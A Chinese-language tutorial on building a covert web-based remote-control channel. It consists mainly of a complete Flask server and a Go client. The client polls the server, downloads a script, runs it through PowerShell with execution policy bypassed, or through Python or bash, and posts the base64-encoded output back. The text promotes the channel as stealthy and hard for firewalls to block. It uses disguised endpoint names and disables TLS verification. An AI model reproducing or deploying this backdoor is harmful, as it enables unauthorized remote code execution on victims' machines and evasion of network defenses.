# 通过web远程控制
### 准备
需要一台服务器,如果部署在公网,还需要一个公网ip.相对于邮箱和git,web远控最大的优点在于安全和隐蔽,前两者端口固定,容易被防火墙拦截,且密钥和密码写在源代码中,一旦被破解全部都要遭殃,而web更灵活,也更方便
### 服务端
```python
#!/usr/bin/python
# -*- coding:utf-8 -*-
import os, logging, re, time, base64
os.chdir(os.path.split(os.path.realpath(__file__))[0])
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s[runtime:%(relativeCreated)d]~'
    '%(filename)s[line:%(lineno)d]~%(levelname)s~%(message)s',
    filename='r.log')
from flask import Flask, request, abort
app = Flask(__name__)


@app.before_request
def before_request():
    # 记录当前请求
    logging.info({
        'headers':
        dict(request.headers),
        'url':
        request.url,
        'ip':
        '%s:%d' % (request.remote_addr, request.environ.get('REMOTE_PORT'))
    })


# userid既是用户名,也是当前目录下的子目录路径
def check_args(userid, stamp):
    # userid不能用数字字母以外的其他字符
    if re.findall('[^a-zA-Z0-9]', userid):
        logging.info(f'illegal character "{userid}"')
        abort(404)
    if not os.path.exists(userid):
        logging.info(f'path "{userid}" does not exist')
        abort(404)
    # stamp用于区分请求.
    # 每次请求命令和返回结果都用同一个stamp,且只能是7位数字
    if re.findall('[^0-9]', stamp) or len(stamp) != 7:
        logging.info(f'illegal stamp "{stamp}"')
        abort(404)


@app.route('/gf8hts', methods=['GET'])
def gf8hts():
    userid = request.args.get('u', '_')
    stamp = request.args.get('s', '0')
    check_args(userid, stamp)
    # 遍历目录,找到第一个txt结尾的文件,读取文件返回,并重命名为: 时间戳_stamp.cmd
    for r, _, f in os.walk(userid):
        for fl in f:
            if fl.endswith('.txt'):
                path = os.path.join(r, fl)
                logging.info(f'find {path}')
                try:
                    c = open(path).read()
                    os.rename(path,
                              os.path.join(
                                  r, f'{int(time.time() * 1000)}_{stamp}.cmd'))
                except:
                    logging.info('read file error')
                    abort(404)
                return c
    abort(404)


@app.route('/raev0k', methods=['POST'])
def raev0k():
    userid = request.args.get('u', '_')
    stamp = request.args.get('s', '0')
    check_args(userid, stamp)

    # 有上传任意文件的风险,无法避免
    for r, _, f in os.walk(userid):
        for fl in f:
            if fl.endswith(f'_{stamp}.cmd'):
                res = os.path.join(r, fl.replace('.cmd', '.res'))
                # 当存在某个还没有被回复的stamp文件时,以它命名,否则不写入
                if not os.path.exists(res):
                    c = base64.b64decode(request.form.get(
                        'r', 'eA==')).decode('utf-8')
                    if c.startswith(f'{stamp}'):
                        open(res, 'w').write(c)
                    abort(404)
    abort(404)


@app.errorhandler(401)
@app.errorhandler(404)
@app.errorhandler(500)
@app.errorhandler(Exception)
def something_wrong(e):
    return 'error'


app.run(host='0.0.0.0', port=54321, debug=False, ssl_context='adhoc')
```
在程序目录下,每个被控端有一个id,以id为目录名,要执行的文件放在目录下,以`.txt`结尾.被控端第一次get请求,服务器返回文件内容,并将`.txt`重命名为`.cmd`文件,第二次被控端以post方式传回命令执行结果,保存为`.res`文件.
### 客户端
```go
package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

func main() {
	id := "theone"

	// 进入当前目录
	os.Chdir(filepath.Dir(os.Args[0]))

	// 发起请求
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	stamp := string([]rune(strconv.FormatInt((time.Now().UnixNano() / 1e8), 10))[4:])
	resp, _ := http.Get("https://127.0.0.1:54321/gf8hts?u=" + id + "&s=" + stamp)
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	c := strings.Split(strings.Replace(string(body), "\r\n", "\n", -1), "\n")

	// 将请求结果写入文件
	cmd := []string{}
	if strings.HasSuffix(c[0], "powershell") {
		cmd = append(cmd, "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "./1.ps1")
	} else if strings.HasSuffix(c[0], "python") {
		cmd = append(cmd, "python", "./1.py")
	} else if strings.HasSuffix(c[0], "bash") {
		cmd = append(cmd, "bash", "./1.sh")
	} else {
		os.Exit(0)
	}
	f, _ := os.Create(cmd[len(cmd)-1])
	w := bufio.NewWriter(f)
	for _, l := range c[1:] {
		fmt.Fprintln(w, l)
	}
	w.Flush()
	f.Close()

	// 执行命令
	res := exec.Command(cmd[0], cmd[1:]...)
	out, _ := res.CombinedOutput()
	ans := stamp + "\n" + string(out)

	// 返回结果
	resp, _ = http.PostForm("https://127.0.0.1:54321/raev0k?u="+id+"&s="+stamp, url.Values{"r": {base64.StdEncoding.EncodeToString([]byte(ans))}})
	defer resp.Body.Close()
}
```
客户端使用golang,更适合跨平台.请求内容,执行它,返回结果.